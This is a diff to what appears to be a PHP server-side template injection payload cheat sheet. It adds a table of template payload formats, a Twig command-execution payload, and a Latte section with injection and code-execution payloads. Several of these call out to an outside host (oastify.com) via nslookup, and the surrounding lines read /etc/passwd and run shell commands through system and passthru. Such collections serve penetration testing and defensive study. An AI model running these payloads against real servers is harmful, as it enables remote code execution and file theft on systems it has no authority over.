@@ -2,15 +2,31 @@
 
 ## Summary
 
+- [Templating Libraries](#templating-libraries)
 - [Smarty](#smarty)
 - [Twig](#twig)
     - [Twig - Basic injection](#twig---basic-injection)
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
+- [Latte](#latte)
+    - [Latte - Basic injection](#latte---basic-injection)
+    - [Latte - Code execution](#latte---code-execution)
 - [patTemplate](#pattemplate)
 - [PHPlib](#phplib-and-html_template_phplib)
 - [Plates](#plates)
+
+
+## Templating Libraries
+
+| Template Name  | Payload Format |
+| -------------- | --------- |
+| Laravel Blade  | `{{ }}`   |
+| Latte          | `{var $X=""}{$X}`   |
+| Mustache       | `{{ }}`   |
+| Plates         | `<?= ?>`  |
+| Smarty         | `{ }`     |
+| Twig           | `{{ }}`   |
 
 
 ## Smarty
@@ -78,6 +94,7 @@ $output = $twig > render (
 {{['cat$IFS/etc/passwd']|filter('system')}}
 {{['id']|filter('passthru')}}
 {{['id']|map('passthru')}}
+{{['nslookup oastify.com']|filter('system')}}
 ```
 
 Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
@@ -94,6 +111,23 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
 
 ---
+
+## Latte
+
+### Latte - Basic injection
+
+```php
+{var $X="POC"}{$X}
+```
+
+### Latte - Code execution
+
+```php
+{php system('nslookup oastify.com')}
+```
+
+---
+
 
 ## patTemplate
 
